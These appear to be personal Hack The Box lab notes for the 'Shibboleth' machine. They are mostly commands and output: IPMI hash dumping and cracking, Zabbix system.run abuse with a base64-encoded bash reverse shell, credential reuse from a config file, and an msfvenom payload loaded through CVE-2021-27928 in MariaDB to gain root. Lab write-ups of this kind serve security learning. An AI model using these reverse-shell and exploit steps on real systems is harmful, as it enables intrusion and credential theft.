@@ -1,0 +1,193 @@
+let's enumerate first:
+command: sudo rustscan -a 10.10.11.124
+result:
+PORT   STATE    SERVICE REASON
+80/tcp filtered http    no-response
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 0.38 seconds
+           Raw packets sent: 6 (240B) | Rcvd: 1 (28B)
+
+command: sudo nmap -sSVC -A -p 80 10.10.11.124
+result:
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.41
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: FlexStart Bootstrap Template - Index
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: phone|general purpose|proxy server|WAP|VoIP phone
+Running (JUST GUESSING): Google Android 4.4.X (92%), Linux 4.X|5.X|3.X|2.6.X (91%), WebSense embedded (90%), Linksys embedded (90%), Cisco embedded (90%)
+OS CPE: cpe:/o:google:android:4.4.0 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:linux:linux_kernel cpe:/o:linux:linux_kernel:3 cpe:/h:linksys:ea3500 cpe:/o:linux:linux_kernel:2.6.32 cpe:/h:cisco:cp-dx80
+Aggressive OS guesses: Android 4.4.0 (92%), Linux 4.15 - 5.6 (91%), Websense Content Gateway (90%), Linux 5.3 - 5.4 (90%), Linux 3.6 - 3.10 (90%), Linksys EA3500 WAP (90%), Linux 2.6.32 (90%), Linux 5.0 - 5.3 (90%), Cisco CP-DX80 collaboration endpoint (Android) (90%), Axis M3006-V network camera (89%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+
+command: wfuzz -u http://shibboleth.htb -H "Host: FUZZ.shibboleth.htb" -w /snap/seclists/34/Discovery/DNS/subdomains-top1million-5000.txt --hw 26
+result:
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://shibboleth.htb/
+Total requests: 4989
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload        
+=====================================================================
+
+000000099:   200        29 L     219 W      3687 Ch     "monitor"      
+000000346:   200        29 L     219 W      3687 Ch     "monitoring"   
+000000390:   200        29 L     219 W      3687 Ch     "zabbix"       
+
+Total time: 0
+Processed Requests: 4989
+Filtered Requests: 4986
+Requests/sec.: 0
+
+put this: 10.10.11.124 shibboleth.htb monitor.shibboleth.htb zabbix.shibboleth.htb monitoring.shibboleth.htb
+to /etc/hosts
+
+access: http://shibboleth.htb/
+please try contact us form 
+result: Error: Unable to load the "PHP Email Form" Library!
+
+command: ./feroxbuster -u http://shibboleth.htb -w /snap/seclists/34/Discovery/Web-Content/raft-medium-directories-lowercase.txt
+result:
+...
+200      GET       29l      174w    14774c http://shibboleth.htb/assets/img/pricing-ultimate.png
+200      GET       20l      126w     9599c http://shibboleth.htb/assets/img/clients/client-7.png
+200      GET      100l      317w    20277c http://shibboleth.htb/assets/img/portfolio/portfolio-3.jpg
+200      GET       88l      408w    36465c http://shibboleth.htb/assets/img/testimonials/testimonials-4.jpg
+200      GET        0l        0w   122008c http://shibboleth.htb/assets/img/portfolio/portfolio-7.jpg
+... 
+nothing important.
+
+access: http://zabbix.shibboleth.htb/
+
+command: sudo nmap -sU -p 623 -sCV shibboleth.htb
+result:
+PORT    STATE SERVICE  VERSION
+623/udp open  asf-rmcp
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port623-UDP:V=7.93%I=7%D=6/30%Time=649EC12C%P=x86_64-pc-linux-gnu%r(ipm
+SF:i-rmcp,1E,"\x06\0\xff\x07\0\0\0\0\0\0\0\0\0\x10\x81\x1cc\x20\x008\0\x01
+SF:\x97\x04\x03\0\0\0\0\t");
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 5.60 seconds
+
+command: msfconsole
+msf6 > use auxiliary/scanner/ipmi/ipmi_version 
+msf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts 10.10.11.124
+result:
+[*] Sending IPMI requests to 10.10.11.124->10.10.11.124 (1 hosts)
+[+] 10.10.11.124:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0) 
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+msf6 auxiliary(scanner/ipmi/ipmi_version) > use auxiliary/scanner/ipmi/ipmi_dumphashes
+msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.10.11.124
+rhosts => 10.10.11.124
+
+msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run
+
+[+] 10.10.11.124:623 - IPMI - Hash found: Administrator:bdd5ebcd82050000ee3e9389b9ebb83005c4c403c9fbe2ebcefe48c480df0ce5b6767851abc8c3c5a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:d4e0255f6d92246ab0cc892f7308600e7dda03ce
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+let's crack password 
+command: hashcat -m 7300 ipmi_hash /home/donika-pentest/Documents/hackthebox/linux/26_postman_easy/rockyou.txt --force --show
+8a6a984a82010000822dbb8b6df3cb6089f9e03ec4a1e4ec9bd8dde46b935324b45e6a8f0092fe00a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:3453903cfbcba683faa696fb466d279864a096c6:ilovepumkinpie1
+
+password: ilovepumkinpie1
+access: http://zabbix.shibboleth.htb/
+username: Administrator
+password: ilovepumkinpie1
+
+access: http://zabbix.shibboleth.htb/hosts.php?form=update&hostid=10084
+access: http://zabbix.shibboleth.htb/items.php?filter_set=1&filter_hostids%5B0%5D=10084
+add items
+access: http://zabbix.shibboleth.htb/items.php?form=create&hostid=10084
+name: 0xdf
+key: system.run[id]
+
+access 0xdf on list item
+access: http://zabbix.shibboleth.htb/items.php?form=update&hostid=10084&itemid=33618
+
+click test, click get value
+value result: uid=110(zabbix) gid=118(zabbix) groups=118(zabbix)
+
+let's create shell code and convert to base64
+command: echo "bash  -i >& /dev/tcp/10.10.16.19/7979 0>&1 " | base64
+result:
+YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMTkvNzk3OSAwPiYxIAo=
+
+put this key to 0xdf
+key: system.run[echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMTkvNzk3OSAwPiYxIAo= | base64 -d | bash, nowait]
+
+command: nc -lvnp 7979
+click test, click get value.
+
+command: su ipmi-svc
+password: ilovepumkinpie1
+
+upgrade shell.
+
+command: netstat -tnl
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State      
+tcp        0      0 0.0.0.0:10050           0.0.0.0:*               LISTEN     
+tcp        0      0 0.0.0.0:10051           0.0.0.0:*               LISTEN     
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
+tcp6       0      0 :::10050                :::*                    LISTEN     
+tcp6       0      0 :::10051                :::*                    LISTEN     
+tcp6       0      0 :::80                   :::*                    LISTEN
+
+command: cat zabbix_server.conf | grep -v "^#" | grep .
+LogFile=/var/log/zabbix/zabbix_server.log
+LogFileSize=0
+PidFile=/run/zabbix/zabbix_server.pid
+SocketDir=/run/zabbix
+DBName=zabbix
+DBUser=zabbix
+DBPassword=bloooarskybluh
+SNMPTrapperFile=/var/log/snmptrap/snmptrap.log
+Timeout=4
+AlertScriptsPath=/usr/lib/zabbix/alertscripts
+ExternalScripts=/usr/lib/zabbix/externalscripts
+FpingLocation=/usr/bin/fping
+Fping6Location=/usr/bin/fping6
+LogSlowQueries=3000
+StatsAllowedIP=127.0.0.1
+
+command: mysql -u zabbix -pbloooarskybluh
+result:
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 955
+Server version: 10.3.25-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+take attention: 10.3.25-MariaDB-0ubuntu0.
+CVE-2021-27928
+
+command: msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.16.19 LPORT=4444 -f elf-so -o rev.so
+upload rev.so to target machine /dev/shm
+
+command: wget http://10.10.16.19:4444/rev.so
+command: mysql -u zabbix -pbloooarskybluh
+
+command: nc -lvnp 4444
+
+mysql> SET GLOBAL wsrep_provider="/dev/shm/rev.so";
+ERROR 2013 (HY000): Lost connection to MySQL server during query
+
+command: cat /root/root.txt
+11645166590d85340aad5ccb60cf5b7d
+
+resource:
+https://0xdf.gitlab.io/2022/04/02/htb-shibboleth.html
+https://systemweakness.com/shibboleth-hackthebox-walkthrough-ec5a398f5e3c
